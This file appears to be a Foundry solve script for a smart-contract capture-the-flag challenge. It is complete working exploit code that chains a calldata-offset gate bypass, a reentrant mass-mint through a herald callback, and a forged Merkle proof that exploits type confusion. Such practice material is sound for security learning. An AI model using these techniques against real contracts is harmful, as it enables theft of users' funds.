// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Script.sol";

import {VoidBoundBlade} from "src/Setup.sol"; // VoidBoundBlade entrypoint.
import {VoidboundSanctum, IForgeHerald} from "src/VoidboundSanctum.sol"; // Target contract + herald interface.
import {IVoidboundSanctum} from "src/interfaces/IVoidboundSanctum.sol"; // Struct types.
import {VoidboundMerkle} from "src/libraries/VoidboundMerkle.sol"; // Merkle constants.

// === Gate helper ===
// shadowTorii checks a fixed calldata offset, so we place a decoy selector there
// while the real payload calls enterSanctum.
contract ToriiWraith {
    constructor(VoidboundSanctum sanctum) {
        bytes4 decoy = bytes4(keccak256("normalFunction()")); // Any selector != enterSanctum.
        bytes4 enterSel = sanctum.enterSanctum.selector; // Actual payload selector.
        bytes memory callData = abi.encodePacked(
            sanctum.performKata.selector, // Function selector.
            bytes32(uint256(0x60)), // Offset to bytes payload.
            bytes32(0), // Padding word (unused head space).
            bytes32(decoy), // Fixed-offset decoy selector.
            bytes32(uint256(4)), // Payload length.
            bytes32(enterSel) // Payload data (enterSanctum selector).
        ); // Crafted calldata to satisfy shadowTorii and still call enterSanctum.
        (bool success, ) = address(sanctum).call(callData); // Constructor call makes extcodesize(msg.sender)==0.
        require(success, "GATE_FAIL"); // Fail fast if gate behavior changes.
    }
}

// === Forge reentrancy helper ===
// Bug: forgeBladeRite calls into a herald before finalizing, enabling re-entry.
contract ForgeHerald is IForgeHerald {
    VoidboundSanctum public immutable sanctum; // Target contract for re-entrant minting.
    uint256 public remaining; // How many additional blades to mint.
    uint256 public edge; // Edge to use for each forged blade.
    uint256 public tempo; // Tempo to use for each forged blade.

    constructor(VoidboundSanctum _sanctum) {
        sanctum = _sanctum; // Cache target for callbacks.
    }

    // Prime the batch so the callback can mint without calldata decoding.
    function prime(uint256 count, uint256 _edge, uint256 _tempo) external {
        remaining = count; // Total blades to mint including the initial one.
        edge = _edge; // Batch edge value to keep stats valid.
        tempo = _tempo; // Batch tempo value to speed attunement.
    }

    // Re-entrant callback fired by forgeBladeRite during the herald phase.
    function onForgeStamp(address, uint256) external override {
        if (remaining == 0) {
            return; // Nothing to do if the batch is already drained.
        }
        remaining -= 1; // Account for the initial forge done by forgeBladeRite.
        while (remaining > 0) {
            remaining -= 1; // Decrement before re-entering to avoid underflow on revert.
            sanctum.forgeBladeViaHerald(edge, tempo); // Re-enter forge to mint the next id.
        }
    }
}

// === Solver entrypoint ===
contract Solve is Script {
    // Script entry: fetch CHALLENGE, then broadcast solve txs.
    function run() external {
        address sanctumAddress = vm.envOr("SANCTUM", address(0)); // Direct instance address.
        if (sanctumAddress == address(0)) {
            sanctumAddress = vm.envAddress("CHALLENGE"); // Fallback to legacy env var.
        }
        vm.startBroadcast(); // Begin sending transactions from the configured signer.
        _solve(sanctumAddress); // Execute exploit flow.
        vm.stopBroadcast(); // End broadcast for clean script exit.
    }

    // === Exploit flow ===
    function _solve(address sanctumAddress) internal {
        VoidboundSanctum sanctum = VoidboundSanctum(sanctumAddress); // Bind the sanctum instance.

        // Torii gate: fixed-offset selector check is satisfied by crafted calldata.
        new ToriiWraith(sanctum); // Sets whitelist[tx.origin] via performKata -> enterSanctum.

        // Gameplay setup after passing the torii gate (no bug here).
        sanctum.awakenRonin(); // Mint our ronin and starter blade.
        sanctum.pledgeClan(0); // Join the forge-enabled clan.

        // Batch-mint blades via the re-entrant forge to reduce tx count.
        uint256 targetPower = 129; // Target attunement used in the XOR path.
        uint256 startAttune = sanctum.getRelic(0).attunement; // Current attunement baseline.
        require(targetPower > startAttune, "BAD_TARGET"); // Prevent underflow in needed.

        ForgeHerald herald = new ForgeHerald(sanctum); // Deploy herald for forge re-entry.
        sanctum.appointForgeHerald(address(herald)); // Register herald for this caller.

        uint256 maxTempo = sanctum.MAX_BLADE_TEMPO(); // Upper tempo bound for safe forging.
        uint256 mintBatch = vm.envOr("MINT_BATCH", uint256(50)); // How many blades to mint per tx.
        uint256 minted = 0; // Track minted blades for id reach.
        while (minted < targetPower) {
            uint256 batch = targetPower - minted;
            if (batch > mintBatch) {
                batch = mintBatch;
            }
            herald.prime(batch, 1, maxTempo); // Prime batch to mint the next ids.
            sanctum.forgeBladeRite(1, maxTempo); // Re-entrant mint in this tx.
            minted += batch;
        }

        uint256 needed = targetPower - startAttune; // Total attunement delta required.
        uint256 full = needed / maxTempo; // Count of full-tempo blades to consume.
        uint256 rem = needed % maxTempo; // Remainder for a final partial blade.
        uint256 extraId = type(uint256).max; // Tracks a remainder blade id, if needed.
        if (rem > 0) {
            extraId = sanctum.forgeBlade(1, rem); // Mint the remainder blade for exact attunement.
        }

        uint256 batchCount = full + (rem > 0 ? 1 : 0); // Total blades to consume in one rite.
        uint256[] memory batch = new uint256[](batchCount); // Packed blade ids for voidAttuneBatch.
        for (uint256 i = 0; i < full; i++) {
            batch[i] = i + 1; // Use ids 1..full from the batch-minted set.
        }
        if (rem > 0) {
            batch[full] = extraId; // Append the remainder blade id.
        }

        bytes memory ritePayload = abi.encodeWithSelector(
            sanctum.voidAttuneBatch.selector,
            batch
        ); // Encode batch for mirrorRite so onlyRite is satisfied.
        sanctum.mirrorRite(ritePayload); // Single tx to consume all blades and raise attunement.

        uint256 targetId = targetPower; // Blade id chosen so XOR path collides with relic subtree.

        IVoidboundSanctum.Relic memory relic0 = sanctum.getRelic(0); // The relic we will type-confuse.
        IVoidboundSanctum.Relic memory relic1 = sanctum.getRelic(1); // Neighbor used to build proof.

        bytes32[] memory proof = _buildBladeProof(
            sanctum,
            relic0,
            relic1
        ); // Build a blade proof that actually authenticates relic data.

        IVoidboundSanctum.Blade memory forgedBlade = IVoidboundSanctum.Blade({
            // Bug 2: XOR path lets blade.id steer into relic subtree (type confusion).
            id: targetId, // Aligns blade path with relic attunement slot.
            edge: relic0.sigil, // Reuse relic sigil as blade damage.
            tempo: relic0.isSealed ? 1 : 0, // Convert sealed bool into tempo=1.
            roninId: relic0.isSealed ? 1 : 0 // Convert sealed bool into roninId=1.
        });

        sanctum.bindBlade(forgedBlade, proof); // Overwrite stored blade via forged proof.
        sanctum.duelShogun(); // Kill the shogun with the forged stats.
    }

    // === Merkle proof construction ===
    function _buildBladeProof(
        VoidboundSanctum sanctum,
        IVoidboundSanctum.Relic memory relic0,
        IVoidboundSanctum.Relic memory relic1
    ) internal view returns (bytes32[] memory proof) {
        bytes32 leftHalf; // Left half of relic0 leaf (id/title/myth/temper).
        bytes32 relic0Root; // Full relic0 leaf root.
        (leftHalf, , relic0Root) = _relicRoots(relic0); // Split the relic leaf.

        bytes32 relic1Root = _relicRoot(relic1); // Root of relic1 leaf.

        proof = new bytes32[](9); // Right-half leaf + relic levels + world levels.
        proof[0] = leftHalf; // Sibling for the forged right-half leaf.
        proof[1] = relic1Root; // Sibling for relic0 at level 1.

        bytes32 node = _hash(relic0Root, relic1Root); // Root of the 0/1 relic pair.
        for (uint256 i = 2; i < 7; i++) { // Fill remaining relic subtree with empty pairs.
            proof[i] = node; // Use same hash as both children (default empty behavior).
            node = _hash(node, node); // Climb one level up the relic subtree.
        }
        bytes32 relicRoot = node; // Final relic subtree root.

        bytes32 bladesRoot = _bladesRoot(sanctum); // Root over all blades in storage.
        proof[7] = bladesRoot; // World sibling: blades root.

        bytes32 leftWorld = _hash(
            keccak256(abi.encode(sanctum.sanctumName())), // World leaf 0: sanctum name.
            keccak256(abi.encode(uint256(1))) // World leaf 1: clan count (1).
        );
        proof[8] = leftWorld; // World sibling: left world subtree.

        bytes32 rightWorld = _hash(relicRoot, bladesRoot); // World right subtree.
        bytes32 expectedRoot = _hash(leftWorld, rightWorld); // Expected full world root.
        require(expectedRoot == sanctum.sanctumRoot(), "BAD_ROOT"); // Sanity check for proof layout.
    }

    // === Merkle helpers (blade side) ===
    function _bladesRoot(VoidboundSanctum sanctum) internal view returns (bytes32 root) {
        uint256 count = sanctum.getBladeCount(); // Only hash actual blades, leave rest zero.
        if (count > VoidboundMerkle.BLADES_NUM_ELEMENTS) {
            count = VoidboundMerkle.BLADES_NUM_ELEMENTS; // Cap to the merkleized range.
        }
        bytes32[] memory hashed = new bytes32[](VoidboundMerkle.BLADES_NUM_ELEMENTS); // Fixed-size tree.
        for (uint256 i; i < count; i++) {
            hashed[i] = _merkleizeBlade(sanctum.getBlade(i)); // Merkleize each blade leaf.
        }
        root = _merkleize(hashed); // Build the full blades subtree root.
    }

    // === Merkle helpers (tree building) ===
    function _merkleize(bytes32[] memory input) internal pure returns (bytes32) {
        uint256 n = _upperPow2(input.length); // Round up to the next power of two.
        bytes32[] memory cache = new bytes32[](n); // Cache used for in-place reduction.
        for (uint256 i; i < input.length; i++) {
            cache[i] = input[i]; // Copy leaves; missing leaves stay zero.
        }
        n /= 2;
        while (n > 0) {
            for (uint256 i; i < n; i++) {
                bytes32 left = cache[2 * i];
                bytes32 right = cache[2 * i + 1];
                if (right == bytes32(0)) {
                    if (left == bytes32(0)) {
                        cache[i] = bytes32(0);
                    } else {
                        cache[i] = keccak256(abi.encodePacked(left, left)); // Mirror left when right is empty.
                    }
                } else {
                    cache[i] = keccak256(abi.encodePacked(left, right)); // Standard Merkle hash.
                }
            }
            n /= 2;
        }
        return cache[0];
    }

    // === Merkle helpers (relic side) ===
    function _upperPow2(uint256 n) private pure returns (uint256 x) {
        x = 1; // Start at 2^0 and grow until we cover n leaves.
        while (n > x) {
            x <<= 1; // Multiply by two to reach the next power.
        }
    }

    function _relicRoot(
        IVoidboundSanctum.Relic memory relic
    ) internal pure returns (bytes32 root) {
        (, , root) = _relicRoots(relic); // Reuse the split helper.
    }

    function _relicRoots(
        IVoidboundSanctum.Relic memory relic
    ) internal pure returns (bytes32 leftHalf, bytes32 rightHalf, bytes32 root) {
        bytes32 h0 = keccak256(abi.encode(relic.id)); // Leaf 0.
        bytes32 h1 = keccak256(abi.encode(relic.title)); // Leaf 1.
        bytes32 h2 = keccak256(abi.encode(relic.myth)); // Leaf 2.
        bytes32 h3 = keccak256(abi.encode(relic.temper)); // Leaf 3.
        bytes32 h4 = keccak256(abi.encode(relic.attunement)); // Leaf 4.
        bytes32 h5 = keccak256(abi.encode(relic.sigil)); // Leaf 5.
        bytes32 h6 = keccak256(abi.encode(relic.isSealed)); // Leaf 6.

        leftHalf = _hash(_hash(h0, h1), _hash(h2, h3)); // Left half of leaf (0..3).
        rightHalf = _hash(_hash(h4, h5), _hash(h6, h6)); // Right half (4..6 + padded).
        root = _hash(leftHalf, rightHalf); // Full relic leaf root.
    }

    function _merkleizeBlade(
        IVoidboundSanctum.Blade memory blade
    ) internal pure returns (bytes32 root) {
        bytes32 h0 = keccak256(abi.encode(blade.id)); // Leaf 0.
        bytes32 h1 = keccak256(abi.encode(blade.edge)); // Leaf 1.
        bytes32 h2 = keccak256(abi.encode(blade.tempo)); // Leaf 2.
        bytes32 h3 = keccak256(abi.encode(blade.roninId)); // Leaf 3.
        root = _hash(_hash(h0, h1), _hash(h2, h3)); // Blade leaf root.
    }

    function _hash(bytes32 left, bytes32 right) private pure returns (bytes32) {
        return keccak256(abi.encodePacked(left, right)); // Merkle node hash.
    }

}
